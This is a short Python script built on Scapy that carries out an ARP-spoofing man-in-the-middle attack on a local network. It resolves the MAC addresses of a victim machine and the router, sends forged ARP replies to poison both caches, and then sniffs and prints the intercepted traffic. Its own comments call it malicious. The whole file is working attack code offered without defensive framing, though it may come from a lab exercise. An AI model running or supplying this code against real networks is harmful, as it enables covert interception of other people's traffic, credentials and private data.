from scapy.all import *

ether = Ether()

## Discovering MAC Address of Target Machine

broadcast1 = Ether(dst = 'ff:ff:ff:ff:ff:ff')
arp_layer1 = ARP(pdst = '192.168.0.49')
entire_packet1 = broadcast1 / arp_layer1
answer1 = srp(entire_packet1, timeout = 2, verbose = True, iface = "enp0s3")[0]

broadcast2 = Ether(dst = 'ff:ff:ff:ff:ff:ff')
arp_layer2 = ARP(pdst = '192.168.0.1')
entire_packet2 = broadcast2 / arp_layer2
answer2 = srp(entire_packet2, timeout = 2, verbose = True, iface = "enp0s3")[0]

## Creating Malicous ARP Response to victims machine
attacker_mac_addr = ether.src

def filterPkt(pkt):

    return Ether in pkt and (
        (pkt[Ether].src == victim_mac_addr and pkt[Ether].dst == attacker_mac_addr) or
        (pkt[Ether].src == attacker_mac_addr and pkt[Ether].dst == router_mac_addr) or 
        (pkt[Ether].src == router_mac_addr and pkt[Ether].dst == attacker_mac_addr)  or
        (pkt[Ether].src == attacker_mac_addr and pkt[Ether].dst == victim_mac_addr)
    )


for i in range(2):
    victim_mac_addr = answer1[0][1].hwsrc
    packet = ARP(op=2, hwdst = victim_mac_addr, pdst='192.168.0.49', psrc='192.168.0.1')
    send(packet, verbose = False, iface = "enp0s3")

    router_mac_addr = answer2[0][1].hwsrc
    packet = ARP(op=2, hwdst = router_mac_addr, pdst='192.168.0.1', psrc='192.168.0.49')
    send(packet, verbose = False, iface = "enp0s3")

    sniff(prn = lambda x: x[0].show(), lfilter = filterPkt, iface = "enp0s3")

